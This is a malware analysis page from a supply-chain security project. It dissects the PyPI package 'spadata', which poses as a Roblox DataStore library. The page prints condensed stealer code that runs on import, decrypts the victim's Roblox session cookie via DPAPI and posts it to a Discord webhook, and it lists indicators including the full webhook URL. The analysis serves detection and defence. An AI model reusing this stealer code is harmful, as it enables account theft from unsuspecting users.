@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>spadata: Gimme all your Roblox — the PyPI DataStore lib that isn&#39;t - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="spadata: Gimme all your Roblox — the PyPI DataStore lib that isn&#39;t - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>spadata: Gimme all your Roblox — the PyPI DataStore lib that isn&#39;t</h1>
+    <span class="post-meta">2026-06-03 &middot; PyPI &middot; spadata</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/spadata-roblox-stickup-meme.jpg" alt="Meme: a kitten with its paws up at gunpoint — 'GIMME ALL YOUR ROBLOX PLZ.' spadata mugs the victim for exactly one thing: their Roblox session cookie.">
+<p><code>spadata</code> sells itself as a Python library for managing your Roblox DataStore and ships none of it — no storage code, no API calls, just a cookie grab that fires the moment you <code>import spadata</code>, with the README misspelling its own name «spaysdata» along the way.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>spadata</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>0.1.1</code></td>
+</tr>
+<tr>
+<td>Summary</td>
+<td><code>Библиотека для работы с DataStore в Roblox</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>Custom Python library for Roblox DataStore.</code></td>
+</tr>
+<tr>
+<td>Requires-Python</td>
+<td><code>&gt;=3.8</code></td>
+</tr>
+<tr>
+<td>Requires-Dist</td>
+<td><code>requests</code>; <code>pywin32; sys_platform == &quot;win32&quot;</code></td>
+</tr>
+<tr>
+<td>Entry point</td>
+<td><code>spadata-run = spadata.main:retrieve_roblox_cookies</code></td>
+</tr>
+<tr>
+<td>Generator</td>
+<td><code>setuptools 82.0.1</code></td>
+</tr>
+<tr>
+<td>Tag</td>
+<td><code>py3-none-any</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="one-import%2C-one-cookie%2C-one-webhook" tabindex="-1"><a class="header-anchor" href="#one-import%2C-one-cookie%2C-one-webhook"><span>One import, one cookie, one webhook</span></a></h2>
+<p>The wheel holds two files and no product: <code>__init__.py</code> calls the stealer at import time inside a bare try/except, so the theft fires when Python loads the package and any error dies silently. It copies Roblox's local cookie store <code>robloxcookies.dat</code> to the temp folder, reads the base64 field, and — since Roblox keeps it DPAPI-encrypted — calls <code>win32crypt.CryptUnprotectData</code> to unlock the loot before taking it. The cleartext <code>.ROBLOSECURITY</code> cookie then posts straight to a hardcoded Discord webhook, captioned <code>Decrypted Content:</code>; replayed in a browser it walks past the password and 2FA, handing over the Robux, the inventory, and the resale value in one string.</p>
+<pre class="lang-js"><code><span class="tok-com"># __init__.py — import is the trigger</span>
+<span class="tok-kw">from</span> .main <span class="tok-kw">import</span> retrieve_roblox_cookies
+<span class="tok-kw">try</span>: <span class="tok-fn">retrieve_roblox_cookies</span>()            <span class="tok-com"># «выполнится АВТОМАТИЧЕСКИ» — runs on import</span>
+<span class="tok-kw">except</span> Exception <span class="tok-kw">as</span> e: <span class="tok-fn">print</span>(e)
+
+<span class="tok-com"># main.py — copy, decrypt, post (condensed)</span>
+webhook = <span class="tok-str">"https://discord.com/api/webhooks/1501511921185325186/0-lN4d-…"</span>
+shutil.<span class="tok-fn">copy</span>(roblox_cookies_path, dst)         <span class="tok-com"># %USERPROFILE%\...\LocalStorage\robloxcookies.dat</span>
+encoded = json.<span class="tok-fn">load</span>(<span class="tok-fn">open</span>(dst))[<span class="tok-str">"CookiesData"</span>]
+clear = win32crypt.<span class="tok-fn">CryptUnprotectData</span>(base64.<span class="tok-fn">b64decode</span>(encoded), <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-num">0</span>)[<span class="tok-num">1</span>]
+requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: <span class="tok-str">"Decrypted Content:"</span>})
+requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: clear.<span class="tok-fn">decode</span>(<span class="tok-str">"utf-8"</span>, errors=<span class="tok-str">"ignore"</span>)})
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/credential/platform</code></td>
+<td>Reads Roblox's local cookie store <code>robloxcookies.dat</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/credential/dpapi</code></td>
+<td>DPAPI-decrypted secret posted to a Discord webhook</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/command-and-control/channel/messaging</code></td>
+<td>Hardcoded <code>discord.com/api/webhooks/...</code> URL</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/credential-access/browser/dpapi</code></td>
+<td><code>win32crypt.CryptUnprotectData</code> on the decoded blob</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>micro-behaviors/data/control-flow/module-exec</code></td>
+<td>Import-time call silenced by try/except</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/anti-static/obfuscation/code-metrics/source</code></td>
+<td>Russian comments trip the non-ASCII ratio</td>
+</tr>
+</tbody>
+</table>
+<p>There's no persistence, no second stage, and no obfuscation past the try/except — just a stickup that works because the mark came for a shortcut and was never going to open <code>__init__.py</code>.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Wheel</td>
+<td><code>spadata-0.1.1-py3-none-any.whl</code></td>
+</tr>
+<tr>
+<td>Wheel SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff"><code>d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff</code></a></td>
+</tr>
+<tr>
+<td><code>main.py</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8"><code>cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8</code></a></td>
+</tr>
+<tr>
+<td><code>__init__.py</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c"><code>44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c</code></a></td>
+</tr>
+<tr>
+<td>Discord webhook</td>
+<td><code>https://discord.com/api/webhooks/1501511921185325186/0-lN4d-dYtJXAI0Wzf_ay225eK_DzM3Prp8-uTh4CVVt-1gDPJHG0SEZL7Pe9GCAQcOT</code></td>
+</tr>
+<tr>
+<td>Cookie file read</td>
+<td><code>%USERPROFILE%\AppData\Local\Roblox\LocalStorage\robloxcookies.dat</code></td>
+</tr>
+<tr>
+<td></content></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
